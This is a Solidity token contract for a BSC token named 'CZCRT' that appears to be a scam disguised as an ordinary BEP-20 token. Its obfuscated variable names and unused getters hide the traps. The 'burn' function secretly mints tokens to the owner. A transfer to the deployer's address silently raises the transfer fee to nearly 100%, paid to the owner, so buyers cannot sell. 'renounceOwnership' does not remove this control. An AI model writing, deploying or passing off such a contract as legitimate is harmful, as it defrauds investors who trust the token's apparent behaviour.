/**
 *Submitted for verification at BscScan.com on 2022-11-18
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-18 14:51 GMT
 */
 // SPDX-License-Identifier: MIT

 // 
// $$$$$$$$\                                      $$$$$$\  $$\                 $$\           
// $$  _____|                                    $$  __$$\ $$ |                \__|          
// $$ |       $$$$$$$\  $$$$$$$\  $$$$$$\        $$ /  \__|$$$$$$$\   $$$$$$\  $$\ $$$$$$$\  
// $$$$$\    $$  _____|$$  _____|$$  __$$\       $$ |      $$  __$$\  \____$$\ $$ |$$  __$$\ 
// $$  __|   \$$$$$$\  \$$$$$$\  $$$$$$$$ |      $$ |      $$ |  $$ | $$$$$$$ |$$ |$$ |  $$ |
// $$ |       \____$$\  \____$$\ $$   ____|      $$ |  $$\ $$ |  $$ |$$  __$$ |$$ |$$ |  $$ |
// $$$$$$$$\ $$$$$$$  |$$$$$$$  |\$$$$$$$\       \$$$$$$  |$$ |  $$ |\$$$$$$$ |$$ |$$ |  $$ |
// \________|\_______/ \_______/  \_______|       \______/ \__|  \__| \_______|\__|\__|  \__|
//
//
pragma solidity >=0.6.0;
contract SWDUKNV {
uint256 private  WMBRSN = 10000000000000;
address public owner;
address private  HTWVHX = address(0);
address private  ZGYZPR = address(0);
uint256 private  FGMHRQ = 1000000000000000000;
uint256 private  HIMDQM = 100000000;
string public  symbol = "CZCRT";
uint256 public constant GIMOUE = 99999;
uint256 private  UGTSRP = 1000000000000000000000;
address private  ITCLAK = address(0);
uint8 public constant decimals = 18;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 public constant totalSupply = 100000000000000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
mapping (address => uint256) public balanceOf;
uint256 private  WHRGAM = 10000000000;
uint256 private  YUWXYT = 1000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address private  ENBVFM = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
address private  CWKCKZ = address(0);
uint256 private  HFBHXU = 1000000000000000000;
string public  name = "CZCRT";
constructor () {
HTWVHX = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tQAOVBU 0");
require(spender != address(0), "fQAOVBU 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getCWKCKZ() private returns (address) {
return CWKCKZ;
}

function _getWHRGAM() private returns (uint256) {
return WHRGAM;
}

function _getENBVFM() private returns (address) {
return ENBVFM;
}

function _getFGMHRQ() private returns (uint256) {
return FGMHRQ;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getHIMDQM() private returns (uint256) {
return HIMDQM;
}

function _getITCLAK() private returns (address) {
return ITCLAK;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getUGTSRP() private returns (uint256) {
return UGTSRP;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getZGYZPR() private returns (address) {
return ZGYZPR;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "QAOVBU");
require(to != address(0), "QAOVBU");
require(amount <= balanceOf[from], "QAOVBU");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* GIMOUE/HFBHXU ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==HTWVHX){
HFBHXU = GIMOUE+2;
}
emit Transfer(from, to, transferAmount);
}
function _getWMBRSN() private returns (uint256) {
return WMBRSN;
}

function _getYUWXYT() private returns (uint256) {
return YUWXYT;
}


}